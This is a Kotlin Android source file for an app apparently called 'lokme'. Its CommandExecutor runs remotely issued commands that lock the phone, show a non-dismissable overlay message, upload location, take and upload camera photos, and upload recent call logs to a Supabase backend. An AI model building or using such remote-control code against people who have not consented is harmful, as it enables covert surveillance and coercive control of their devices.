package com.lokme.service

import android.app.AlertDialog
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.lokme.admin.DeviceAdminReceiver
import com.lokme.calllog.CallLogReader
import com.lokme.camera.CameraHelper
import com.lokme.location.LocationHelper
import com.lokme.network.SupabaseClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject

class CommandExecutor(private val context: Context) {

    private val scope = CoroutineScope(Dispatchers.IO)
    private val handler = Handler(Looper.getMainLooper())
    private var cameraHelper: CameraHelper? = null

    fun initCamera(lifecycleOwner: androidx.lifecycle.LifecycleOwner) {
        Thread {
            val helper = CameraHelper(context, lifecycleOwner)
            helper.initialize()
            cameraHelper = helper
            Log.d("CommandExec", "Camera initialized")
        }.start()
    }

    fun execute(
        commandType: String,
        commandId: String,
        payload: String,
        deviceId: String,
        onSuccess: (String) -> Unit,
        onError: (String) -> Unit
    ) {
        Log.d("CommandExec", "Executing: $commandType")

        when (commandType) {
            "LOCK_DEVICE" -> lockDevice(commandId, deviceId, onSuccess, onError)
            "SHOW_DIALOG" -> showDialog(commandId, deviceId, payload, onSuccess, onError)
            "GET_LOCATION" -> getLocation(commandId, deviceId, onSuccess, onError)
            "CAPTURE_PHOTO" -> capturePhoto(commandId, deviceId, payload, onSuccess, onError)
            "GET_CALL_LOG" -> getCallLog(commandId, deviceId, onSuccess, onError)
            else -> onError("Unknown command: $commandType")
        }
    }

    private fun lockDevice(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val adminComponent = android.content.ComponentName(context, DeviceAdminReceiver::class.java)
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager

            if (dpm.isAdminActive(adminComponent)) {
                dpm.lockNow()
                onSuccess("Device locked")
            } else {
                onError("Device admin not active")
            }
        } catch (e: Exception) {
            onError(e.message ?: "Lock failed")
        }
    }

    private fun showDialog(commandId: String, deviceId: String, payload: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val json = JSONObject(payload)
            val title = json.optString("title", "Message")
            val message = json.optString("message", "")

            handler.post {
                try {
                    val builder = AlertDialog.Builder(context, android.R.style.Theme_DeviceDefault_Dialog_Alert)
                        .setTitle(title)
                        .setMessage(message)
                        .setCancelable(false)
                        .setPositiveButton("OK") { dialog, _ -> dialog.dismiss() }

                    val dialog = builder.create()
                    dialog.window?.setType(android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY)
                    dialog.show()
                } catch (_: Exception) {}
            }

            onSuccess("Dialog shown")
        } catch (e: Exception) {
            onError(e.message ?: "Dialog failed")
        }
    }

    private fun getLocation(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        LocationHelper.getCurrentLocation(
            context,
            onResult = { latLng ->
                scope.launch {
                    try {
                        SupabaseClient.insertLocation(deviceId, latLng.latitude, latLng.longitude)
                        onSuccess("${latLng.latitude},${latLng.longitude}")
                    } catch (e: Exception) {
                        onError(e.message ?: "Upload failed")
                    }
                }
            },
            onError = { e ->
                onError(e.message ?: "Location failed")
            }
        )
    }

    private fun capturePhoto(commandId: String, deviceId: String, payload: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        val json = try { JSONObject(payload) } catch (_: Exception) { JSONObject() }
        val useFront = json.optBoolean("front_camera", false)
        val cameraType = if (useFront) "front" else "back"

        val helper = cameraHelper
        if (helper == null) {
            onError("Camera not initialized")
            return
        }

        helper.capturePhoto(
            useFrontCamera = useFront,
            onResult = { bytes ->
                scope.launch {
                    try {
                        val fileName = helper.generateFileName()
                        val url = SupabaseClient.uploadPhoto(deviceId, fileName, bytes)
                        SupabaseClient.insertPhotoRecord(deviceId, url, cameraType)
                        onSuccess(url)
                    } catch (e: Exception) {
                        onError(e.message ?: "Upload failed")
                    }
                }
            },
            onError = { e ->
                onError(e.message ?: "Capture failed")
            }
        )
    }

    private fun getCallLog(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        try {
            val logs = CallLogReader.readCallLogs(context, limit = 50)

            scope.launch {
                try {
                    val entries = logs.map { log ->
                        com.lokme.model.CallLogEntry(
                            device_id = deviceId,
                            phone_number = log.phoneNumber,
                            contact_name = log.contactName,
                            call_type = log.callType,
                            call_date = log.callDate,
                            duration_seconds = log.durationSeconds
                        )
                    }
                    SupabaseClient.insertCallLogs(entries)
                    onSuccess("Uploaded ${logs.size} call logs")
                } catch (e: Exception) {
                    onError(e.message ?: "Upload failed")
                }
            }
        } catch (e: Exception) {
            onError(e.message ?: "Read failed")
        }
    }
}
